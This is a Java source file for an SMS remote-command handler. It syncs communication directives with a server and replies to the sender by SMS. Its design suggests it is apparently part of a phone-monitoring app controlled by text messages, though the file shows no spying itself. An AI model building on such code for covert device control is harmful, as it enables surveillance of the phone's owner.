package com.vvt.rmtcmd.sms;

import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.GetCommunicationDirectivesCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSSyncCommDirective extends RmtCmdAsync implements PhoenixProtocolListener {
	
	public SMSSyncCommDirective(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// Runnable
	public void run() {
		/*doSMSHeader(smsCmdCode.getSyncCommDirectiveCmd());
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// TODO: Not Supported
		*/
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
//		Log.debug("CmdSyncCommunicationDirective.execute()", "ENTER!");
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}	
	
	public void onError(String message) {
		Log.error("CmdSyncCommDirective.onError()", "message: " + message);
		/*syncTimeMng.removeListener(this);*/
		doSMSHeader(smsCmdCode.getSyncCommDirectiveCmd());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	public void onSuccess(CommandResponse response) {
		/*syncTimeMng.removeListener(this);*/
		doSMSHeader(smsCmdCode.getSyncCommDirectiveCmd());
		if (response instanceof GetCommunicationDirectivesCmdResponse) {
			GetCommunicationDirectivesCmdResponse getCommDirectResp = (GetCommunicationDirectivesCmdResponse)response;
			if (getCommDirectResp.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(getCommDirectResp.getServerMsg());							
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSyncCommunicationDirective.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}	
}
